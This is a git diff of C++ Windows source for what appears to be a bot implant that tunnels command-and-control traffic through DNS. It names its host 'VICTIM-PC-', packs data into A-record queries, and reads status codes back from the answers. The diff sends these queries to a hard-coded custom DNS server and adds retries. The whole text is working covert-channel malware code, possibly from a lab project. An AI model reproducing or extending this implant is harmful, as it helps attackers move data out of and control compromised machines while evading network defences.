@@ -1,8 +1,10 @@
 #define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define WIN32_LEAN_AND_MEAN
+
+#include <ws2tcpip.h>
 #include "Network.h"
 #include "Utilities.h"
 #include <iostream>
-#include <ws2tcpip.h>
 #include <string>
 
 // WinAPI
@@ -15,10 +17,10 @@ using namespace std;
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "Dnsapi.lib") 
 
-const char* SERVER_IP = "127.0.0.1";
-const int SERVER_PORT = 53;
-const char* BOT_ID = "VICTIM-PC-01";
-SOCKET clientSocket = INVALID_SOCKET;
+const char*		SERVER_IP		= "127.0.0.1";
+const char*		BOT_ID			= "VICTIM-PC-";
+const int		SERVER_PORT		= 53;
+	  SOCKET	clientSocket	= INVALID_SOCKET;
 
 string CreateDNSPacket(const string& jsonData) {
     string packet;
@@ -92,22 +94,39 @@ void SendHeartbeat() {
 }
 
 int startConnection(const char* domain) {
-	std::string fullString = "a.1.1.1.";
-	fullString += domain;
+	
+	std::string fullString =  std::string("a.1.1.1.") + domain; // "a.1.1.1."s declares a string with C++17
 	const char* pOwnerName = fullString.c_str();
 	WORD wType = DNS_TYPE_A;
 	PDNS_RECORD pDnsRecord;
+	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));	// Allocate memory for the DNS server list. IP4_ARRAY contains 1 IP address.
+
+	if (!pSrvList) {
+		std::cerr << "Error allocating memory for DNS server list." << std::endl;
+		return -1;
+	}
+
+	pSrvList->AddrCount = 1;	// Only use 1 custom DNS server.
+	pSrvList->AddrArray[0] = inet_addr(CUSTOM_DNS_SERVER_IP);	// Convert IP string to numeric DWORD (IP4_ADDRESS)
+
+	
 	DNS_STATUS status = DnsQuery_A
-		(
-			pOwnerName,
-			wType,
-			dns_options,
-			nullptr,
-			&pDnsRecord,
-			nullptr
-		);  // sends two requests for some reason?
+	(
+		pOwnerName,
+		wType,
+		dns_options,
+		&pSrvList,
+		&pDnsRecord,
+		nullptr
+	);  // sends two requests for some reason?
+	
+	// Free the memory allocated to the server list after use.
+	if (pSrvList) {
+		LocalFree(pSrvList); 
+	}
 	
 	if (status) {
+		std::cerr << "DnsQuery failed with status: " << status << std::endl;
 		return -1;
 	} else {
 		IN_ADDR ipaddr;
@@ -124,22 +143,32 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 	std::string full = fullStream.str();
 	const char* pOwnerName = full.c_str();
 	std::cout << pOwnerName << std::endl;
-	WORD wType = DNS_TYPE_A;
-	PDNS_RECORD pDnsRecord;
+	const WORD wType = DNS_TYPE_A;
+	PDNS_RECORD pDnsRecord = nullptr;
+	PIP4_ARRAY pSrvList = static_cast<PIP4_ARRAY>(LocalAlloc(LPTR, sizeof(IP4_ARRAY)));
+	if (!pSrvList) {
+		return -1; // fail
+	}
+	pSrvList->AddrCount = 1;
+	pSrvList->AddrArray[0] = inet_addr(CUSTOM_DNS_SERVER_IP);
 	
-	DNS_STATUS status = DnsQuery_A
+	DNS_STATUS status;
+	int retCode = -1; // The default return code is failure
+	
+	// retry 5 times, then give up this message
+	for (int i = 0; i < 5; i++) {
+		pDnsRecord = nullptr; // Reset the cursor each iteration
+		status = DnsQuery_A
 		(
 			pOwnerName,
 			wType,
 			dns_options,
-			nullptr,
+			pSrvList,
 			&pDnsRecord,
 			nullptr
 		);
-	
-	// retry 5 times, then give up this message
-	for (int i = 0; i < 5; i++) {
-		if (!status) {
+		
+		if (!status && pDnsRecord) {
 			IN_ADDR ipaddr;
 			ipaddr.S_un.S_addr = (pDnsRecord->Data.A.IpAddress);
 			std::string ipStr = inet_ntoa(ipaddr);
@@ -149,7 +178,8 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 			std::cout << "Response Code: " << code << std::endl;
 			switch (code) {
 				case 200:  // processed normally
-					return 0;
+					retCode = 0;
+					goto cleanup;
 				case 201:  // malformed
 					break;
 				case 202:  // connection non-existent
@@ -170,18 +200,14 @@ int sendData(int& id, int& packetNumber, const char* domain, const char* data) {
 					return -1;
 			}
 		}
-		status = DnsQuery_A
-		(
-			pOwnerName,
-			wType,
-			dns_options,
-			nullptr,
-			&pDnsRecord,
-			nullptr
-		);
+		Sleep(500);
 	}
 	
-	return -1;
+	cleanup:
+		if (pSrvList) {
+			LocalFree(pSrvList);
+		}
+	return retCode;
 }
 
 std::string convertToHex(const char* string) {
